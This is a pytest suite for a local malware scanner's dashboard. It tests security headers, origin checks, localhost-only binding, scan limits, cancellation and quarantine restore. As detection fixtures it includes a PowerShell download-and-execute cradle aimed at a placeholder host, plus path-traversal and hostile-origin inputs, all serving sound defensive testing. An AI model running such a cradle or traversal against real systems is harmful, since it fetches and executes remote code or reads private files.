"""Dashboard: security headers, origin checks, local-only binding, job
cancellation / time and file limits, shutdown control, rescan-before-restore."""

from __future__ import annotations

import hashlib
import http.client
import json
import threading
import time
from http.server import ThreadingHTTPServer
from pathlib import Path

import pytest
from _builders import make_zip

from warden.config import Config
from warden.gui import server as gui
from warden.models import FileResult, Finding, ScanReport, Severity
from warden.quarantine import Quarantine
from warden.scanner import ScanLimits, Scanner


@pytest.fixture()
def srv(home, monkeypatch):
    monkeypatch.setattr(gui, "JOBS", gui.JobManager())
    httpd = ThreadingHTTPServer(("127.0.0.1", 0), gui.Handler)
    httpd.daemon_threads = True
    thread = threading.Thread(target=httpd.serve_forever, daemon=True)
    thread.start()
    try:
        yield httpd
    finally:
        httpd.shutdown()
        httpd.server_close()
        thread.join(timeout=5)


def call(srv, method, path, body=None, *, token=True, headers=None):
    port = srv.server_address[1]
    conn = http.client.HTTPConnection("127.0.0.1", port, timeout=10)
    hdrs = {"Host": f"127.0.0.1:{port}"}
    if token:
        hdrs["X-Warden-Token"] = gui._TOKEN
    payload = None
    if body is not None:
        payload = body if isinstance(body, bytes) else json.dumps(body).encode()
        hdrs["Content-Type"] = "application/json"
    hdrs.update(headers or {})
    conn.request(method, path, body=payload, headers=hdrs)
    resp = conn.getresponse()
    raw = resp.read()
    conn.close()
    try:
        data = json.loads(raw)
    except ValueError:
        data = raw
    return resp.status, dict(resp.getheaders()), data


def wait_job(srv, job_id, timeout=30):
    deadline = time.time() + timeout
    while time.time() < deadline:
        _, _, job = call(srv, "GET", f"/api/job/{job_id}")
        if job["status"] != "running":
            return job
        time.sleep(0.05)
    raise AssertionError("job did not finish")


# -- headers + page ------------------------------------------------------
def test_security_headers_on_every_kind_of_response(srv):
    for method, path, tok in (("GET", "/", False), ("GET", "/static/app.js", False),
                              ("GET", "/api/status", True), ("GET", "/api/status", False),
                              ("GET", "/nope", False), ("POST", "/api/nope", True)):
        status, headers, _ = call(srv, method, path, token=tok)
        csp = headers["Content-Security-Policy"]
        assert "default-src 'none'" in csp and "script-src 'self'" in csp, (path, status)
        assert "'unsafe-inline'" not in csp and "'unsafe-eval'" not in csp
        assert "frame-ancestors 'none'" in csp and "form-action 'none'" in csp
        assert headers["X-Content-Type-Options"] == "nosniff"
        assert headers["X-Frame-Options"] == "DENY"
        assert headers["Referrer-Policy"] == "no-referrer"
        assert headers["Cache-Control"] == "no-store"
        assert headers["Cross-Origin-Resource-Policy"] == "same-origin"
        assert "Python" not in headers.get("Server", "")


def test_page_has_no_inline_script_or_style():
    """The strict CSP only holds if the page really has no inline code."""
    html = (gui.STATIC_DIR / "index.html").read_text(encoding="utf-8")
    import re
    assert not re.search(r"<script(?![^>]*\bsrc=)[^>]*>", html), "inline <script> found"
    assert "<style" not in html and " style=" not in html
    assert not re.search(r"\son[a-z]+\s*=", html), "inline event handler found"
    js = (gui.STATIC_DIR / "app.js").read_text(encoding="utf-8")
    assert "eval(" not in js and "new Function" not in js
    assert 'setAttribute("style"' not in js and "style:" not in js


def test_token_is_delivered_in_meta_tag(srv):
    _, _, html = call(srv, "GET", "/", token=False)
    assert f'<meta name="warden-token" content="{gui._TOKEN}">'.encode() in html
    assert b"__WARDEN_TOKEN__" not in html


def test_page_states_it_is_local_only(srv):
    _, _, html = call(srv, "GET", "/", token=False)
    assert b"Local only" in html and b"not reachable from your network" in html
    assert b"not real-time protection" in html
    status, _, data = call(srv, "GET", "/api/status")
    assert status == 200 and data["local_only"] is True
    assert data["address"].startswith("127.0.0.1:")
    assert data["limits"]["max_active_jobs"] == gui._MAX_ACTIVE_JOBS


# -- origin / binding ----------------------------------------------------
def test_cross_origin_posts_are_refused(srv, tmp_path):
    port = srv.server_address[1]
    body = {"path": str(tmp_path)}
    for bad in ({"Origin": "https://evil.example"}, {"Origin": "null"},
                {"Origin": f"http://127.0.0.1:{port + 1}"}, {"Sec-Fetch-Site": "cross-site"},
                {"Sec-Fetch-Site": "same-site"}):
        status, _, data = call(srv, "POST", "/api/scan", body, headers=bad)
        assert status == 403 and "cross-origin" in data["error"], bad
    assert gui.JOBS.running_count() == 0

    for good in ({"Origin": f"http://127.0.0.1:{port}"}, {"Origin": f"http://localhost:{port}"},
                 {"Sec-Fetch-Site": "same-origin"}):
        status, _, data = call(srv, "POST", "/api/scan", body, headers=good)
        assert status == 200, good
        wait_job(srv, data["job"])


def test_refuses_to_bind_to_a_network_interface():
    for host in ("0.0.0.0", "192.168.1.10", "", "::", "example.com"):
        with pytest.raises(ValueError, match="local-only"):
            gui.serve(host=host, port=0, open_browser=False)
    assert gui.check_bind_host("127.0.0.1") == "127.0.0.1"


def test_non_ascii_token_does_not_crash(srv):
    status, _, _ = call(srv, "GET", "/api/status", token=False,
                        headers={"X-Warden-Token": "t\xf6ken"})
    assert status == 403


# -- input limits --------------------------------------------------------
@pytest.mark.parametrize("body", [
    {"path": 12345}, {"path": ["a"]}, {"path": ""}, {"path": "x" * 5000},
    {"path": "a\x00b"}, {"path": "/definitely/not/here/xyz"}, {}, [], "str", 5, None,
    {"path": ".", "min_severity": ["low"]}, {"path": ".", "min_severity": 99},
])
def test_scan_rejects_malformed_requests(srv, body):
    status, _, _ = call(srv, "POST", "/api/scan", body)
    assert status == 400
    assert gui.JOBS.running_count() == 0


def test_deeply_nested_json_is_survived(srv):
    payload = (b"[" * 100_000) + (b"]" * 100_000)
    status, _, _ = call(srv, "POST", "/api/scan", payload)
    assert status == 400
    assert call(srv, "GET", "/api/status")[0] == 200       # server still healthy


def test_job_ids_are_validated(srv):
    assert call(srv, "GET", "/api/job/../../etc/passwd")[0] == 404
    assert call(srv, "GET", "/api/job/zzzzzzzzzzzz")[0] == 404
    assert call(srv, "POST", "/api/job/000000000000/cancel")[0] == 404
    assert call(srv, "POST", "/api/job/not-a-job/cancel")[0] == 404


def test_time_limit_is_clamped():
    assert gui._time_limit(None) == gui._JOB_TIME_LIMIT
    assert gui._time_limit("abc") == gui._JOB_TIME_LIMIT
    assert gui._time_limit(-5) == gui._JOB_TIME_LIMIT
    assert gui._time_limit(float("nan")) == gui._JOB_TIME_LIMIT
    assert gui._time_limit(1) == gui._JOB_MIN_TIME_LIMIT
    assert gui._time_limit(10**9) == gui._JOB_TIME_LIMIT
    assert gui._time_limit(600) == 600


# -- scanner limits ------------------------------------------------------
def _tree(tmp_path: Path, n: int) -> Path:
    d = tmp_path / "tree"
    d.mkdir()
    for i in range(n):
        (d / f"f{i:03}.txt").write_text(f"file {i}")
    return d


def test_scanner_file_limit_marks_report_incomplete(tmp_path):
    scanner = Scanner(Config(data_dir=tmp_path / "data"))
    report = scanner.scan_path(_tree(tmp_path, 20), limits=ScanLimits(max_files=5))
    assert len(report.results) == 5 and report.stopped == "file limit reached"
    assert not report.coverage_complete and report.coverage()["stopped"] == "file limit reached"


def test_scanner_time_limit_and_cancel(tmp_path):
    scanner = Scanner(Config(data_dir=tmp_path / "data"))
    tree = _tree(tmp_path, 20)
    report = scanner.scan_path(tree, limits=ScanLimits(timeout=1e-9))
    assert report.stopped == "time limit reached" and len(report.results) < 20

    seen = []
    limits = ScanLimits(cancel=lambda: len(seen) >= 3)
    report = scanner.scan_path(tree, progress=seen.append, limits=limits)
    assert report.stopped == "cancelled" and len(report.results) == 3

    full = scanner.scan_path(tree, limits=ScanLimits())
    assert full.stopped is None and full.coverage_complete and len(full.results) == 20


def test_cli_exit_code_for_stopped_scan(home, tmp_path):
    from typer.testing import CliRunner

    from warden.cli import app
    res = CliRunner().invoke(app, ["scan", str(_tree(tmp_path, 10)), "--max-files", "3"])
    assert res.exit_code == 2 and "STOPPED" in res.output


# -- jobs: cancel / limits / concurrency --------------------------------
def test_job_can_be_cancelled_and_keeps_partial_results(srv, tmp_path, monkeypatch):
    tree = _tree(tmp_path, 40)
    (tree / "invoice.pdf.exe").write_bytes(b"x")          # flagged by name
    gate = threading.Event()
    real = Scanner._scan_file

    def slow(self, path, report):
        if len(report.results) >= 2:
            gate.wait(10)                                  # park until the test cancels
        return real(self, path, report)

    monkeypatch.setattr(Scanner, "_scan_file", slow)
    status, _, data = call(srv, "POST", "/api/scan", {"path": str(tree), "save": False})
    assert status == 200
    job_id = data["job"]
    while call(srv, "GET", f"/api/job/{job_id}")[2]["count"] < 2:
        time.sleep(0.02)

    assert call(srv, "POST", f"/api/job/{job_id}/cancel")[0] == 200
    gate.set()
    job = wait_job(srv, job_id)
    assert job["status"] == "cancelled"
    assert job["report"]["stopped"] == "cancelled"
    assert job["report"]["coverage"]["complete"] is False
    assert job["report"]["results_total"] < 41             # it really stopped early
    assert call(srv, "POST", f"/api/job/{job_id}/cancel")[0] == 404   # nothing left to cancel


def test_job_time_limit_stops_the_scan(srv, tmp_path, monkeypatch):
    monkeypatch.setattr(gui, "_JOB_MIN_TIME_LIMIT", 0.05)
    real = Scanner._scan_file

    def slow(self, path, report):
        time.sleep(0.05)
        return real(self, path, report)

    monkeypatch.setattr(Scanner, "_scan_file", slow)
    _, _, data = call(srv, "POST", "/api/scan",
                      {"path": str(_tree(tmp_path, 60)), "save": False, "time_limit": 0.05})
    job = wait_job(srv, data["job"])
    assert job["status"] == "done" and job["report"]["stopped"] == "time limit reached"
    assert job["report"]["results_total"] < 60


def test_job_file_limit(srv, tmp_path, monkeypatch):
    monkeypatch.setattr(gui, "_JOB_MAX_FILES", 4)
    _, _, data = call(srv, "POST", "/api/scan", {"path": str(_tree(tmp_path, 12)), "save": False})
    job = wait_job(srv, data["job"])
    assert job["report"]["stopped"] == "file limit reached"


def test_concurrent_job_cap_is_race_free(srv, tmp_path, monkeypatch):
    gate = threading.Event()
    monkeypatch.setattr(gui, "_run_scan_job", lambda job_id, *a, **k: gate.wait(10))
    results = []

    def fire():
        results.append(call(srv, "POST", "/api/scan", {"path": str(tmp_path)})[0])

    threads = [threading.Thread(target=fire) for _ in range(8)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    gate.set()
    assert sorted(results) == [200] * gui._MAX_ACTIVE_JOBS + [429] * (8 - gui._MAX_ACTIVE_JOBS)


def test_job_report_keeps_only_interesting_results(srv, tmp_path):
    tree = _tree(tmp_path, 25)
    (tree / "invoice.pdf.exe").write_bytes(b"x")
    (tree / "pack.zip").write_bytes(make_zip({"readme.pdf.exe": b"y"}))
    _, _, data = call(srv, "POST", "/api/scan", {"path": str(tree), "save": False})
    job = wait_job(srv, data["job"])
    report = job["report"]
    assert report["results_total"] == 27 and report["files_scanned"] == 27
    assert len(report["results"]) == 2 and report["results_truncated"] is False
    assert all(r["findings"] for r in report["results"])
    assert report["coverage"]["archives_opened"] == 1

    # The quarantine handle indexes the slimmed list the client was given.
    idx = next(i for i, r in enumerate(report["results"]) if r["path"].endswith("invoice.pdf.exe"))
    status, _, out = call(srv, "POST", "/api/quarantine/add", {"job": data["job"], "index": idx})
    assert status == 200, out
    assert not (tree / "invoice.pdf.exe").exists()
    for bad in (True, -1, 99, "0", None, 1.5):
        assert call(srv, "POST", "/api/quarantine/add", {"job": data["job"], "index": bad})[0] == 400


def test_slim_report_truncates(monkeypatch):
    monkeypatch.setattr(gui, "_MAX_JOB_RESULTS", 3)
    report = ScanReport(root="x")
    for i in range(10):
        sev = Severity.CRITICAL if i == 7 else Severity.LOW
        report.results.append(FileResult(path=f"f{i}", findings=[Finding("e", "n", sev)]))
    report.results.append(FileResult(path="clean"))
    slim = gui._slim_report(report)
    assert len(slim["results"]) == 3 and slim["results_truncated"] is True
    assert slim["results"][0]["path"] == "f7"              # most severe first
    assert slim["results_total"] == 11


# -- quarantine restore: rescan first -----------------------------------
def _quarantine(tmp_path, name, data):
    f = tmp_path / name
    f.write_bytes(data)
    result = FileResult(path=str(f), size=len(data), sha256=hashlib.sha256(data).hexdigest(),
                        findings=[Finding("yara", "T", Severity.HIGH)])
    return Quarantine().quarantine_file(result), f


def test_restore_needs_confirmation_when_still_detected(srv, tmp_path):
    entry, path = _quarantine(tmp_path, "evil.ps1",
                              b"IEX (New-Object Net.WebClient).DownloadString('http://x') -nop -w hidden")
    status, _, data = call(srv, "POST", "/api/quarantine/restore", {"id": entry.id})
    assert status == 409 and data["needs_confirm"] and data["still_threat"] is True
    assert not path.exists()

    for not_true in ("true", 1, "yes"):                    # only a real JSON true confirms
        assert call(srv, "POST", "/api/quarantine/restore",
                    {"id": entry.id, "confirm": not_true})[0] == 409
    assert not path.exists()

    status, _, data = call(srv, "POST", "/api/quarantine/restore", {"id": entry.id, "confirm": True})
    assert status == 200 and path.exists()


def test_restore_is_direct_when_no_longer_detected(srv, tmp_path):
    entry, path = _quarantine(tmp_path, "notes.txt", b"ordinary notes")
    status, _, data = call(srv, "POST", "/api/quarantine/restore", {"id": entry.id})
    assert status == 200 and path.read_bytes() == b"ordinary notes"
    assert call(srv, "POST", "/api/quarantine/restore", {"id": "0000000000000000"})[0] == 400
    assert call(srv, "POST", "/api/quarantine/restore", {"id": "../../x"})[0] == 400
    assert call(srv, "POST", "/api/quarantine/delete", {"id": "../../x"})[0] == 400


# -- shutdown ------------------------------------------------------------
def test_shutdown_requires_token_and_stops_the_server(home, monkeypatch):
    monkeypatch.setattr(gui, "JOBS", gui.JobManager())
    httpd = ThreadingHTTPServer(("127.0.0.1", 0), gui.Handler)
    thread = threading.Thread(target=httpd.serve_forever, daemon=True)
    thread.start()
    try:
        assert call(httpd, "POST", "/api/shutdown", token=False)[0] == 403
        assert call(httpd, "POST", "/api/shutdown", headers={"Origin": "https://evil.example"})[0] == 403
        assert call(httpd, "GET", "/api/shutdown")[0] == 404          # never via GET
        assert thread.is_alive()

        job_id = gui.JOBS.create("scan")
        status, _, data = call(httpd, "POST", "/api/shutdown")
        assert status == 200 and data == {"ok": True}
        thread.join(timeout=10)
        assert not thread.is_alive()                                   # serve_forever returned
        assert gui.JOBS.cancel_event(job_id).is_set()                  # running jobs told to stop
    finally:
        if thread.is_alive():
            httpd.shutdown()
        httpd.server_close()


def test_sweep_job_honours_online_and_offline(srv, monkeypatch):
    seen = {}

    class FakeSweep:
        def __init__(self, cfg):
            seen["online"] = cfg.online_hash_lookup

        def run(self, **kw):
            seen["limits"] = kw["limits"]
            return ScanReport(root="<system-sweep>", finished="2026-01-01T00:00:00+00:00"), []

    monkeypatch.setattr(gui, "SystemSweep", FakeSweep)
    _, _, data = call(srv, "POST", "/api/sweep", {"online": True, "save": False, "quick": True})
    job = wait_job(srv, data["job"])
    assert job["status"] == "done" and seen["online"] is True
    assert seen["limits"].max_files == gui._JOB_MAX_FILES
